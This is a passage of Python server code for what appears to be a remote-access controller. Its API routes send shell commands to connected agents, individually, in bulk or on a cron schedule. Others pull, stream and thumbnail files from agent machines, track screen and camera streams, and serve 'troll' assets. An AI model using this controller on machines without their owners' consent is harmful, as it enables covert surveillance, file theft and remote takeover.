            e2e = E2EEncryption(agent_id, shared_secret)
            payload['command'] = e2e.encrypt(command)
            payload['encrypted'] = True
        except Exception:
            payload['command'] = command
    else:
        payload['command'] = command
    socketio.emit('command', payload, room=agent_sid)
    try:
        audit.log_action(session.get('user_id'), 'EXECUTE_COMMAND', agent_id=agent_id, details={'command': command}, severity='WARNING')
    except Exception:
        pass
    
    return jsonify({
        'success': True,
        'execution_id': execution_id,
        'command': command,
        'agent_id': agent_id
    })

@app.route('/api/agents/<agent_id>/commands/history', methods=['GET'])
@require_auth
def get_command_history(agent_id):
    """Get command execution history for an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    # In a real implementation, this would be stored in a database
    # For now, return mock data
    history = [
        {
            'id': 1,
            'command': 'systeminfo',
            'output': 'Host Name: WIN-DESKTOP-01\nOS Name: Microsoft Windows 11...',
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'success': True,
            'execution_time': 2.5
        },
        {
            'id': 2,
            'command': 'dir C:\\',
            'output': 'Volume in drive C has no label.\nDirectory of C:\\\n\n...',
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'success': True,
            'execution_time': 1.2
        }
    ]
    
    return jsonify({
        'history': history,
        'total_count': len(history)
    })

_RANGE_RE = re.compile(r'bytes=(\d*)-(\d*)')

def _extract_b64(s):
    if not isinstance(s, str) or not s:
        return None
    return s.split(',', 1)[1] if ',' in s else s

def _guess_mime(path: str):
    mime, _ = mimetypes.guess_type(path)
    if mime:
        return mime
    return 'application/octet-stream'

def _request_agent_file_range(agent_id: str, agent_sid: str, file_path: str, start: Optional[int], end: Optional[int], timeout_s: float = 30.0):
    if start == 0 and end == 0:
        cached = get_cached_metadata(agent_id, file_path)
        if cached:
            return cached
    request_id = f"range_{int(time.time() * 1000)}_{secrets.token_hex(6)}"
    ev = threading.Event()
    with FILE_WAITERS_LOCK:
        FILE_RANGE_WAITERS[request_id] = {'event': ev, 'data': None}
    socketio.emit('request_file_range', {
        'agent_id': agent_id,
        'request_id': request_id,
        'path': file_path,
        'start': start,
        'end': end
    }, room=agent_sid)
    ev.wait(timeout_s)
    with FILE_WAITERS_LOCK:
        waiter = FILE_RANGE_WAITERS.pop(request_id, None)
    if not waiter:
        return None
    result = waiter.get('data')
    if result and start == 0 and end == 0 and not result.get('error'):
        set_cached_metadata(agent_id, file_path, result)
    return result

def _request_agent_thumbnail(agent_id: str, agent_sid: str, file_path: str, size: int, timeout_s: float = 20.0):
    request_id = f"thumb_{int(time.time() * 1000)}_{secrets.token_hex(6)}"
    ev = threading.Event()
    with FILE_WAITERS_LOCK:
        FILE_THUMB_WAITERS[request_id] = {'event': ev, 'data': None}
    socketio.emit('request_file_thumbnail', {
        'agent_id': agent_id,
        'request_id': request_id,
        'path': file_path,
        'size': size
    }, room=agent_sid)
    ev.wait(timeout_s)
    with FILE_WAITERS_LOCK:
        waiter = FILE_THUMB_WAITERS.pop(request_id, None)
    if not waiter:
        return None
    return waiter.get('data')

def _request_agent_faststart(agent_id: str, agent_sid: str, file_path: str, force: bool = False, timeout_s: float = 60.0):
    request_id = f"fast_{int(time.time() * 1000)}_{secrets.token_hex(6)}"
    ev = threading.Event()
    with FILE_WAITERS_LOCK:
        FILE_FASTSTART_WAITERS[request_id] = {'event': ev, 'data': None}
    socketio.emit('request_file_faststart', {
        'agent_id': agent_id,
        'request_id': request_id,
        'path': file_path,
        'force': force
    }, room=agent_sid)
    ev.wait(timeout_s)
    with FILE_WAITERS_LOCK:
        waiter = FILE_FASTSTART_WAITERS.pop(request_id, None)
    if not waiter:
        return None
    return waiter.get('data')

# File Management API
@app.route('/api/agents/<agent_id>/files', methods=['GET'])
@require_auth
def browse_files(agent_id):
    """Browse files on an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    path = request.args.get('path', '/')
    
    # In a real implementation, this would request files from the agent
    # For now, return mock data
    files = [
        {'name': '..', 'type': 'directory', 'size': None, 'modified': datetime.datetime.utcnow().isoformat() + 'Z', 'path': '..'},
        {'name': 'Documents', 'type': 'directory', 'size': None, 'modified': datetime.datetime.utcnow().isoformat() + 'Z', 'path': '/Documents'},
        {'name': 'Downloads', 'type': 'directory', 'size': None, 'modified': datetime.datetime.utcnow().isoformat() + 'Z', 'path': '/Downloads'},
        {'name': 'config.txt', 'type': 'file', 'size': 1024, 'modified': datetime.datetime.utcnow().isoformat() + 'Z', 'path': '/config.txt', 'extension': 'txt'},
        {'name': 'data.json', 'type': 'file', 'size': 2048, 'modified': datetime.datetime.utcnow().isoformat() + 'Z', 'path': '/data.json', 'extension': 'json'}
    ]
    
    return jsonify({
        'files': files,
        'current_path': path,
        'total_count': len(files)
    })

@app.route('/api/agents/<agent_id>/files/download', methods=['POST'])
@require_auth
def download_file(agent_id):
    """Download a file from an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    
    file_path = request.json.get('path')
    if not file_path:
        return jsonify({'error': 'File path is required'}), 400
    
    # Generate download ID
    download_id = f"dl_{int(time.time())}_{secrets.token_hex(4)}"
    
    # Emit to agent
    socketio.emit('download_file', {
        'path': file_path,
        'download_id': download_id
    }, room=agent_sid)
    
    return jsonify({
        'success': True,
        'download_id': download_id,
        'file_path': file_path
    })

@app.route('/api/agents/<agent_id>/files/upload', methods=['POST'])
@require_auth
def upload_file(agent_id):
    """Upload a file to an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    # Handle file upload
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    # Generate upload ID
    upload_id = f"ul_{int(time.time())}_{secrets.token_hex(4)}"
    
    # In a real implementation, you would handle the file transfer
    # For now, just return success
    return jsonify({
        'success': True,
        'upload_id': upload_id,
        'filename': file.filename
    })

@app.route('/api/agents/<agent_id>/files/stream', methods=['GET'])
@require_auth
def stream_agent_file(agent_id):
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400

    file_path = request.args.get('path', '')
    if not file_path:
        return jsonify({'error': 'File path is required'}), 400

    mime = _guess_mime(file_path)
    range_header = request.headers.get('Range')
    timeout_s = 10.0
    initial_chunk_size = 256 * 1024

    if range_header:
        m = _RANGE_RE.match(range_header.strip())
        if not m:
            return Response(status=416)
        start_s, end_s = m.group(1), m.group(2)
        start = int(start_s) if start_s != '' else None
        end = int(end_s) if end_s != '' else None

        if start is None and end is not None:
            meta = _request_agent_file_range(agent_id, agent_sid, file_path, 0, 0, timeout_s)
            if not meta or meta.get('error'):
                return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 504
            total_size = int(meta.get('total_size') or 0)
            suffix_len = end
            if total_size <= 0 or suffix_len <= 0:
                return Response(status=416)
            start = max(0, total_size - suffix_len)
            end = total_size - 1
        elif end is None:
            meta = _request_agent_file_range(agent_id, agent_sid, file_path, 0, 0, timeout_s)
            if not meta or meta.get('error'):
                return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 504
            total_size = int(meta.get('total_size') or 0)
            if total_size <= 0:
                return Response(status=416)
            chunk_len = initial_chunk_size
            s = int(start or 0)
            e = min(s + chunk_len - 1, total_size - 1)
            start = s
            end = e
        data = _request_agent_file_range(agent_id, agent_sid, file_path, start, end if end is not None else -1, timeout_s)
        if not data:
            return jsonify({'error': 'Timeout'}), 504
        if data.get('error'):
            return jsonify({'error': data.get('error')}), 404

        total_size = int(data.get('total_size') or 0)
        b64 = _extract_b64(data.get('data') or data.get('chunk'))
        if not b64:
            return jsonify({'error': 'Empty response'}), 502
        try:
            raw = base64.b64decode(b64)
        except Exception:
            return jsonify({'error': 'Invalid data'}), 502

        actual_start = int(data.get('start') if data.get('start') is not None else (start or 0))
        actual_end = int(data.get('end') if data.get('end') is not None else (actual_start + len(raw) - 1))
        if total_size > 0:
            actual_end = min(actual_end, total_size - 1)

        resp = Response(raw, status=206, mimetype=mime)
        resp.headers['Accept-Ranges'] = 'bytes'
        resp.headers['Content-Length'] = str(len(raw))
        if total_size > 0:
            resp.headers['Content-Range'] = f'bytes {actual_start}-{actual_end}/{total_size}'
        resp.headers['Content-Disposition'] = 'inline'
        resp.headers['Cache-Control'] = 'private, max-age=3600'
        resp.headers['X-Accel-Buffering'] = 'no'
        return resp

    # No Range header: serve initial chunk as partial content for progressive playback
    meta = _request_agent_file_range(agent_id, agent_sid, file_path, 0, 0, timeout_s)
    if not meta or meta.get('error'):
        return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 504
    total_size = int(meta.get('total_size') or 0)
    if total_size <= 0:
        return jsonify({'error': 'Empty file'}), 404
    chunk_len = initial_chunk_size
    end = min(chunk_len - 1, total_size - 1)
    data = _request_agent_file_range(agent_id, agent_sid, file_path, 0, end, timeout_s)
    if not data:
        return jsonify({'error': 'Timeout'}), 504
    if data.get('error'):
        return jsonify({'error': data.get('error')}), 404
    b64 = _extract_b64(data.get('data') or data.get('chunk'))
    if not b64:
        return jsonify({'error': 'Empty response'}), 502
    try:
        raw = base64.b64decode(b64)
    except Exception:
        return jsonify({'error': 'Invalid data'}), 502
    actual_start = 0
    actual_end = int(data.get('end') if data.get('end') is not None else end)
    resp = Response(raw, status=206, mimetype=mime)
    resp.headers['Accept-Ranges'] = 'bytes'
    resp.headers['Content-Length'] = str(len(raw))
    resp.headers['Content-Range'] = f'bytes {actual_start}-{actual_end}/{total_size}'
    resp.headers['Content-Disposition'] = 'inline'
    resp.headers['Cache-Control'] = 'private, max-age=3600'
    resp.headers['X-Accel-Buffering'] = 'no'
    return resp

@app.route('/api/agents/<agent_id>/files/stream_faststart', methods=['GET'])
@require_auth
def stream_agent_file_faststart(agent_id):
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400

    file_path = request.args.get('path', '')
    if not file_path:
        return jsonify({'error': 'File path is required'}), 400

    target_path = file_path
    ext = (os.path.splitext(file_path)[1] or '').lower().lstrip('.')
    should_faststart = ext in {'mp4', 'm4v', 'mov'}
    if should_faststart:
        cached = _faststart_cache_get(agent_id, file_path)
        if cached and cached.get('ok') and isinstance(cached.get('path'), str) and cached.get('path'):
            target_path = str(cached.get('path'))
        elif cached and cached.get('ok') is False:
            target_path = file_path
        else:
            faststart = _request_agent_faststart(agent_id, agent_sid, file_path, False)
            if faststart and not faststart.get('error'):
                p = faststart.get('path') or faststart.get('transformed_path')
                if isinstance(p, str) and p.strip():
                    target_path = p.strip()
                    _faststart_cache_set(agent_id, file_path, target_path, ok=True)
                else:
                    _faststart_cache_set(agent_id, file_path, None, ok=False)
            else:
                _faststart_cache_set(agent_id, file_path, None, ok=False)

    mime = _guess_mime(target_path)
    range_header = request.headers.get('Range')

    if range_header:
        m = _RANGE_RE.match(range_header.strip())
        if not m:
            return Response(status=416)
        start_s, end_s = m.group(1), m.group(2)
        start = int(start_s) if start_s != '' else None
        end = int(end_s) if end_s != '' else None

        if start is None and end is not None:
            meta = _request_agent_file_range(agent_id, agent_sid, target_path, 0, 0)
            if not meta or meta.get('error'):
                return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 404
            total_size = int(meta.get('total_size') or 0)
            suffix_len = end
            if total_size <= 0 or suffix_len <= 0:
                return Response(status=416)
            start = max(0, total_size - suffix_len)
            end = total_size - 1
        elif end is None:
            meta = _request_agent_file_range(agent_id, agent_sid, target_path, 0, 0)
            if not meta or meta.get('error'):
                return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 404
            total_size = int(meta.get('total_size') or 0)
            if total_size <= 0:
                return Response(status=416)
            chunk_len = _get_stream_chunk_size(agent_id)
            s = int(start or 0)
            e = min(s + chunk_len - 1, total_size - 1)
            start = s
            end = e

        data = _request_agent_file_range(agent_id, agent_sid, target_path, start, end if end is not None else -1)
        if not data:
            return jsonify({'error': 'Timeout'}), 504
        if data.get('error'):
            return jsonify({'error': data.get('error')}), 404

        total_size = int(data.get('total_size') or 0)
        b64 = _extract_b64(data.get('data') or data.get('chunk'))
        if not b64:
            return jsonify({'error': 'Empty response'}), 502
        try:
            raw = base64.b64decode(b64)
        except Exception:
            return jsonify({'error': 'Invalid data'}), 502

        actual_start = int(data.get('start') if data.get('start') is not None else (start or 0))
        actual_end = int(data.get('end') if data.get('end') is not None else (actual_start + len(raw) - 1))
        if total_size > 0:
            actual_end = min(actual_end, total_size - 1)

        resp = Response(raw, status=206, mimetype=mime)
        resp.headers['Accept-Ranges'] = 'bytes'
        resp.headers['Content-Length'] = str(len(raw))
        if total_size > 0:
            resp.headers['Content-Range'] = f'bytes {actual_start}-{actual_end}/{total_size}'
        resp.headers['Content-Disposition'] = 'inline'
        resp.headers['Cache-Control'] = 'private, max-age=30'
        resp.headers['X-Accel-Buffering'] = 'no'
        return resp

    # No Range header: serve initial chunk as partial content for progressive playback
    meta = _request_agent_file_range(agent_id, agent_sid, target_path, 0, 0)
    if not meta or meta.get('error'):
        return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 504
    total_size = int(meta.get('total_size') or 0)
    if total_size <= 0:
        return jsonify({'error': 'Empty file'}), 404
    chunk_len = _get_stream_chunk_size(agent_id)
    end = min(chunk_len - 1, total_size - 1)
    _t0 = time.time()
    data = _request_agent_file_range(agent_id, agent_sid, target_path, 0, end)
    _elapsed = time.time() - _t0
    if not data:
        _adjust_stream_chunk_size(agent_id, _elapsed, success=False)
        return jsonify({'error': 'Timeout'}), 504
    if data.get('error'):
        _adjust_stream_chunk_size(agent_id, _elapsed, success=False)
        return jsonify({'error': data.get('error')}), 404
    b64 = _extract_b64(data.get('data') or data.get('chunk'))
    if not b64:
        return jsonify({'error': 'Empty response'}), 502
    try:
        raw = base64.b64decode(b64)
    except Exception:
        return jsonify({'error': 'Invalid data'}), 502
    actual_start = 0
    actual_end = int(data.get('end') if data.get('end') is not None else end)
    resp = Response(raw, status=206, mimetype=mime)
    resp.headers['Accept-Ranges'] = 'bytes'
    resp.headers['Content-Length'] = str(len(raw))
    resp.headers['Content-Range'] = f'bytes {actual_start}-{actual_end}/{total_size}'
    resp.headers['Content-Disposition'] = 'inline'
    resp.headers['Cache-Control'] = 'private, max-age=30'
    resp.headers['X-Accel-Buffering'] = 'no'
    _adjust_stream_chunk_size(agent_id, _elapsed, success=True)
    return resp

@app.route('/api/agents/<agent_id>/files/thumbnail', methods=['GET'])
@require_auth
def thumbnail_agent_file(agent_id):
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400

    file_path = request.args.get('path', '')
    if not file_path:
        return jsonify({'error': 'File path is required'}), 400

    try:
        size = int(request.args.get('size', '128'))
    except Exception:
        size = 128
    size = max(16, min(size, 256))

    timeout_s = 5.0
    data = _request_agent_thumbnail(agent_id, agent_sid, file_path, size, timeout_s)
    if not data:
        return jsonify({'error': 'Timeout'}), 504
    if data.get('error'):
        return jsonify({'error': data.get('error')}), 404

    mime = str(data.get('mime') or 'image/jpeg')
    b64 = _extract_b64(data.get('data') or data.get('thumb') or data.get('chunk'))
    if not b64:
        return jsonify({'error': 'Empty response'}), 502
    try:
        raw = base64.b64decode(b64)
    except Exception:
        return jsonify({'error': 'Invalid data'}), 502

    resp = Response(raw, status=200, mimetype=mime)
    resp.headers['Cache-Control'] = 'public, max-age=7200, immutable'
    resp.headers['Content-Length'] = str(len(raw))
    resp.headers['Content-Disposition'] = 'inline'
    return resp

# Serve controller-hosted trolling assets
@app.route('/troll-assets/<asset_id>')
def serve_troll_asset(asset_id):
    try:
        exp = int(request.args.get('exp') or 0)
        sig = request.args.get('sig') or ''
        if exp <= int(time.time()):
            return ("expired", 410)
        sig_src = f'{asset_id}.{exp}.{Config.SECRET_KEY}'
        expected = hashlib.sha256(sig_src.encode()).hexdigest()
        if sig != expected:
            return ("forbidden", 403)
        meta = TROLL_ASSETS.get(asset_id)
        if not meta or not os.path.isfile(meta['path']):
            return ("not found", 404)
        mime = mimetypes.guess_type(meta['path'])[0] or 'application/octet-stream'
        return send_file(meta['path'], mimetype=mime)
    except Exception:
        return ("server error", 500)
# System Monitoring API
@app.route('/api/system/stats', methods=['GET'])
@require_auth
def get_system_stats():
    """Get overall system statistics"""
    online_agents = [a for a in AGENTS_DATA.values() if a.get('sid')]
    
    stats = {
        'agents': {
            'total': len(AGENTS_DATA),
            'online': len(online_agents),
            'offline': len(AGENTS_DATA) - len(online_agents)
        },
        'streams': {
            'active': 2,  # Mock data
            'screen': 1,
            'camera': 1,
            'audio': 0
        },
        'commands': {
            'executed_today': 127,  # Mock data
            'successful': 115,
            'failed': 12
        },
        'network': {
            'status': 'stable',
            'latency': 12,
            'throughput': 2.4
        }
    }
    
    return jsonify(stats)

@app.route('/api/agents/<agent_id>/performance', methods=['GET'])
@require_auth
def get_agent_performance(agent_id):
    """Get performance metrics for a specific agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    data = AGENTS_DATA[agent_id]
    
    # Mock performance data - in real implementation, this would come from the agent
    performance = {
        'cpu': {
            'usage': data.get('cpu_usage', 45),
            'temperature': 65,
            'cores': 8,
            'frequency': 3.2
        },
        'memory': {
            'used': data.get('memory_usage', 62),
            'total': 16,
            'available': 6.1
        },
        'storage': {
            'used': 78,
            'total': 500,
            'available': 110
        },
        'network': {
            'upload': 2.4,
            'download': 15.7,
            'latency': data.get('network_latency', 12)
        }
    }
    
    return jsonify(performance)

# Activity Feed API
@app.route('/api/activity', methods=['GET'])
@require_auth
def get_activity_feed():
    """Get activity feed with optional filtering"""
    activity_type = sanitize_input(request.args.get('type', 'all'))
    try:
        limit = int(request.args.get('limit', 50))
    except Exception:
        limit = 50
    
    # Mock activity data - in real implementation, this would be stored in a database
    activities = [
        {
            'id': 'act-001',
            'type': 'connection',
            'action': 'Agent Connected',
            'details': 'Successfully established connection',
            'agent_id': 'agent-001',
            'agent_name': 'Windows-Desktop-01',
            'timestamp': (datetime.datetime.utcnow() - datetime.timedelta(seconds=30)).isoformat() + 'Z',
            'status': 'success'
        },
        {
            'id': 'act-002',
            'type': 'stream',
            'action': 'Screen Stream Started',
            'details': 'High quality stream initiated',
            'agent_id': 'agent-001',
            'agent_name': 'Windows-Desktop-01',
            'timestamp': (datetime.datetime.utcnow() - datetime.timedelta(minutes=2)).isoformat() + 'Z',
            'status': 'info'
        },
        {
            'id': 'act-003',
            'type': 'command',
            'action': 'Command Executed',
            'details': 'systeminfo command completed successfully',
            'agent_id': 'agent-002',
            'agent_name': 'Linux-Server-01',
            'timestamp': (datetime.datetime.utcnow() - datetime.timedelta(minutes=3)).isoformat() + 'Z',
            'status': 'success'
        }
    ]
    
    # Filter by type if specified
    if activity_type != 'all':
        activities = [a for a in activities if a['type'] == activity_type]
    
    # Limit results
    activities = activities[:limit]
    
    return jsonify({
        'activities': activities,
        'total_count': len(activities),
        'filter': activity_type
    })

# Quick Actions API
@app.route('/api/actions/bulk', methods=['POST'])
@require_auth
def execute_bulk_action():
    """Execute a bulk action on multiple agents"""
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    
    action = request.json.get('action')
    agent_ids = request.json.get('agent_ids', [])
    
    if not action:
        return jsonify({'error': 'Action is required'}), 400
    
    # If no specific agents provided, apply to all online agents
    if not agent_ids:
        agent_ids = [aid for aid, data in AGENTS_DATA.items() if data.get('sid')]
    
    results = []
    for agent_id in agent_ids:
        if agent_id in AGENTS_DATA:
            agent_sid = AGENTS_DATA[agent_id].get('sid')
            if agent_sid:
                # Emit action as a command for agent-side handling
                socketio.emit('command', {
                    'command': str(action),
                    'execution_id': f"bulk_{int(time.time())}_{secrets.token_hex(4)}"
                }, room=agent_sid)
                
                results.append({
                    'agent_id': agent_id,
                    'status': 'sent',
                    'message': f'Action {action} sent to agent'
                })
            else:
                results.append({
                    'agent_id': agent_id,
                    'status': 'failed',
                    'message': 'Agent not connected'
                })
        else:
            results.append({
                'agent_id': agent_id,
                'status': 'failed',
                'message': 'Agent not found'
            })
    
    return jsonify({
        'success': True,
        'action': action,
        'results': results,
        'total_agents': len(agent_ids),
        'successful': len([r for r in results if r['status'] == 'sent'])
    })

def execute_command_internal(agent_id: str, command: str):
    if agent_id not in AGENTS_DATA:
        return {'agent_id': agent_id, 'status': 'error', 'message': 'Agent not found'}
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return {'agent_id': agent_id, 'status': 'error', 'message': 'Agent not connected'}
    platform = str(AGENTS_DATA.get(agent_id, {}).get('platform', 'windows')).lower()
    ok, msg = validate_command(command, platform)
    if not ok:
        return {'agent_id': agent_id, 'status': 'blocked', 'message': msg}
    execution_id = f"exec_{int(time.time())}_{secrets.token_hex(4)}"
    payload = {'execution_id': execution_id}
    shared_secret = os.environ.get('AGENT_SHARED_SECRET', '')
    if shared_secret:
        try:
            e2e = E2EEncryption(agent_id, shared_secret)
            payload['command'] = e2e.encrypt(command)
            payload['encrypted'] = True
        except Exception:
            payload['command'] = command
    else:
        payload['command'] = command
    socketio.emit('command', payload, room=agent_sid)
    return {'agent_id': agent_id, 'status': 'sent', 'execution_id': execution_id}

def parse_cron_expression(expr: str):
    parts = (expr or '* * * * *').split()
    while len(parts) < 5:
        parts.append('*')
    keys = ['minute', 'hour', 'day', 'month', 'day_of_week']
    return {k: parts[i] for i, k in enumerate(keys)}

scheduler = BackgroundScheduler()
scheduler.start()

@app.route('/api/tasks/schedule', methods=['POST'])
@require_auth
def schedule_task():
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    data = request.json
    agent_id = data.get('agent_id')
    command = data.get('command')
    cron = str(data.get('cron', '* * * * *'))
    if not agent_id or not command:
        return jsonify({'error': 'agent_id and command are required'}), 400
    trigger_kwargs = parse_cron_expression(cron)
    job_id = f"task_{agent_id}_{int(time.time())}"
    scheduler.add_job(func=execute_command_internal, trigger='cron', args=[agent_id, command], id=job_id, **trigger_kwargs)
    return jsonify({'success': True, 'job_id': job_id})

@app.route('/api/groups/<int:group_id>/execute', methods=['POST'])
@require_auth
def execute_on_group(group_id):
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    command = request.json.get('command')
    db = get_db()
    memberships = db.query(DbAgentGroupMembership).filter(DbAgentGroupMembership.group_id == group_id).all()
    db.close()
    results = []
    for m in memberships:
        r = execute_command_internal(m.agent_id, command or '')
        results.append(r)
    return jsonify({'results': results})

if LIMITER_AVAILABLE:
    pass

# Search and Filter API
@app.route('/api/agents/search', methods=['GET'])
@require_auth
def search_agents():
    """Search and filter agents"""
    search_term = str(sanitize_input(request.args.get('q', ''))).lower()
    status_filter = sanitize_input(request.args.get('status'))
    platform_filter = sanitize_input(request.args.get('platform'))
    capability_filter = sanitize_input(request.args.get('capability'))
    
    agents = []
    for agent_id, data in AGENTS_DATA.items():
        agent_info = {
            'id': agent_id,
            'name': data.get('name', f'Agent-{agent_id}'),
            'status': 'online' if data.get('sid') else 'offline',
            'platform': data.get('platform', 'Unknown'),
            'ip': data.get('ip', '0.0.0.0'),
            'last_seen': data.get('last_seen'),
            'capabilities': data.get('capabilities', ['screen', 'files', 'commands']),
            'performance': {
                'cpu': data.get('cpu_usage', 0),
                'memory': data.get('memory_usage', 0),
                'network': data.get('network_usage', 0)
            }
        }
        
        # Apply filters
        if search_term:
            if not (search_term in agent_info['name'].lower() or 
                   search_term in agent_info['platform'].lower() or 
                   search_term in agent_info['ip']):
                continue
        
        if status_filter and agent_info['status'] != status_filter:
            continue
        
        if platform_filter and platform_filter.lower() not in agent_info['platform'].lower():
            continue
        
        if capability_filter and capability_filter not in agent_info['capabilities']:
            continue
        
        agents.append(agent_info)
    
    return jsonify({
        'agents': agents,
        'total_count': len(agents),
        'filters': {
            'search': search_term,
            'status': status_filter,
            'platform': platform_filter,
            'capability': capability_filter
        }
    })

# Settings Management API
@app.route('/api/settings', methods=['GET'])
@require_auth
def get_settings():
    """Get current system settings (merged with defaults)."""
    current = load_settings()
    # Redact sensitive values
    safe = json.loads(json.dumps(current))
    try:
        if 'authentication' in safe:
            # Do not return admin password; apiKey can be returned if enabled
            if 'adminPassword' in safe['authentication']:
                safe['authentication']['adminPassword'] = ''
            # Mask API key partially
            api = safe['authentication'].get('apiKey')
            if api:
                safe['authentication']['apiKey'] = api[:4] + "***" + api[-4:]
            if 'trustedDevices' in safe['authentication']:
                safe['authentication']['trustedDevices'] = []
        if 'email' in safe and 'password' in safe['email']:
            safe['email']['password'] = ''
    except Exception as e:
        print(f"Warning redacting settings: {e}")
    return jsonify(safe)

if LIMITER_AVAILABLE:
    pass

@app.route('/api/security/blocked_ips', methods=['GET'])
@require_auth
def get_blocked_ips():
    s = load_settings().get('security', {})
    ips = s.get('blocked_ips') or []
    return jsonify({'blocked_ips': ips, 'count': len(ips)})

@app.route('/api/security/blocked_ips', methods=['POST'])
@require_auth
def update_blocked_ips():
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    incoming = request.json.get('blocked_ips')
    if not isinstance(incoming, list):
        return jsonify({'error': 'blocked_ips must be an array'}), 400
    validated = []
    try:
        import ipaddress
        for entry in incoming:
            if not isinstance(entry, str):
                continue
            e = entry.strip()
            if not e:
                continue
            try:
                if '/' in e:
                    ipaddress.ip_network(e, strict=False)
                    validated.append(e)
                else:
                    ipaddress.ip_address(e)
                    validated.append(e)
            except Exception:
                continue
    except Exception:
        pass
    current = load_settings()
    sec = current.get('security', {})
    sec['blocked_ips'] = sorted(list(set(validated)))
    current['security'] = sec
    if not save_settings(current):
        return jsonify({'success': False, 'message': 'Failed to save settings'}), 500
    return jsonify({'success': True, 'blocked_ips': sec['blocked_ips'], 'count': len(sec['blocked_ips'])})

@app.route('/api/settings', methods=['POST'])
@require_auth
def update_settings():
    """Update system settings and persist to settings.json. Some changes may need restart."""
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    incoming = request.json
    current = load_settings()
    updated = _deep_update(current, incoming)
    if not save_settings(updated):
        return jsonify({'success': False, 'message': 'Failed to save settings'}), 500

    # Apply a subset live where safe (e.g., WebRTC toggles)
    try:
        if 'webrtc' in incoming:
            webrtc = incoming['webrtc']
            if 'enabled' in webrtc:
                WEBRTC_CONFIG['enabled'] = bool(webrtc['enabled'])
            if 'iceServers' in webrtc:
                WEBRTC_CONFIG['ice_servers'] = webrtc['iceServers']
    except Exception as e:
        print(f"Warning applying live settings: {e}")

    # Determine if restart is required for certain keys
    restart_required = False
    critical_paths = [
        ('server', 'serverPort'),
        ('server', 'sslEnabled'),
        ('security', 'frontendOrigins')
    ]
    for sect, key in critical_paths:
        if sect in incoming and key in incoming.get(sect, {}):
            restart_required = True
            break
    # Notify all connected agents of new config
    try:
        for _agent_id, _data in AGENTS_DATA.items():
            if _data.get('sid'):
                _emit_agent_config(_agent_id)
    except Exception:
        pass
    return jsonify({'success': True, 'message': 'Settings saved.', 'restart_required': restart_required})

if LIMITER_AVAILABLE:
    pass

@app.route('/api/settings/reset', methods=['POST'])
@require_auth
def reset_settings():
    """Reset settings to default values"""
    defaults = json.loads(json.dumps(DEFAULT_SETTINGS))
    if not save_settings(defaults):
        return jsonify({'success': False, 'message': 'Failed to reset settings'}), 500
    # Apply a safe subset immediately
    WEBRTC_CONFIG['enabled'] = defaults['webrtc']['enabled']
    WEBRTC_CONFIG['ice_servers'] = defaults['webrtc']['iceServers']
    return jsonify({'success': True, 'message': 'Settings reset to defaults'})

# System Information API
@app.route('/api/system/info', methods=['GET'])
@require_auth
def get_system_info():
    """Get system information and status"""
    import platform
    
    # Base server info (always available)
    info = {
        'server': {
            'platform': platform.system(),
            'platform_release': platform.release(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'hostname': platform.node(),
            'python_version': platform.python_version()
        },
        'webrtc': {
            'available': WEBRTC_AVAILABLE,
            'active_connections': len(WEBRTC_PEER_CONNECTIONS),
            'active_streams': len(WEBRTC_STREAMS),
            'active_viewers': len(WEBRTC_VIEWERS)
        },
        'agents': {
            'total': len(AGENTS_DATA),
            'online': len([a for a in AGENTS_DATA.values() if a.get('sid')]),
            'platforms': list(set([data.get('platform', 'Unknown') for data in AGENTS_DATA.values()]))
        }
    }
    
    # Try to add performance info if psutil is available
    try:
        import psutil
        
        # Get detailed system information
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        # Get CPU information
        cpu_count = psutil.cpu_count()
        cpu_freq = psutil.cpu_freq()
        cpu_freq_ghz = round(cpu_freq.current / 1000, 2) if cpu_freq else 0
        
        # Get memory information in GB
        memory_total_gb = round(memory.total / (1024**3), 1)
        memory_used_gb = round(memory.used / (1024**3), 1)
        memory_available_gb = round(memory.available / (1024**3), 1)
        
        # Get disk information in GB
        disk_total_gb = round(disk.total / (1024**3), 1)
        disk_used_gb = round(disk.used / (1024**3), 1)
